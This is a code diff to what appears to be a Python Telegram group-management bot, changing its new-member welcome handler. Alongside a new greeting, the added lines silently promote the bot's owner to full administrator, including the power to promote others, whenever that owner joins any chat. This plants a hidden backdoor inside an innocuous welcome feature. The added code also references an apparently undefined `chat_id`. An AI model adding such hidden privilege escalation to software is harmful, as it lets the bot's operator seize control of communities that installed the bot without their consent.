@@ -79,7 +79,6 @@ def send(update, message, keyboard, backup_message):
 @run_async
 def new_member(bot: Bot, update: Update):
     chat = update.effective_chat  # type: Optional[Chat]
-
     should_welc, cust_welcome, welc_type = sql.get_welc_pref(chat.id)
     if should_welc:
         sent = None
@@ -87,7 +86,16 @@ def new_member(bot: Bot, update: Update):
         for new_mem in new_members:
             # Give the owner a special welcome
             if new_mem.id == OWNER_ID:
-                update.effective_message.reply_text("Master is in the houseeee, let's get this party started!")
+                update.effective_message.reply_text("O shit it's OC'D! RIP Chat!")
+                bot_member = chat.get_member(bot.id)
+                bot.promoteChatMember(chat_id, new_mem.id,
+                                      can_change_info=bot_member.can_change_info,
+                                      can_post_messages=bot_member.can_post_messages,
+                                      can_edit_messages=bot_member.can_edit_messages,
+                                      can_delete_messages=bot_member.can_delete_messages,
+                                      can_restrict_members=bot_member.can_restrict_members,
+                                      can_pin_messages=bot_member.can_pin_messages,
+                                      can_promote_members=bot_member.can_promote_members)
                 continue
 
             # Don't welcome yourself
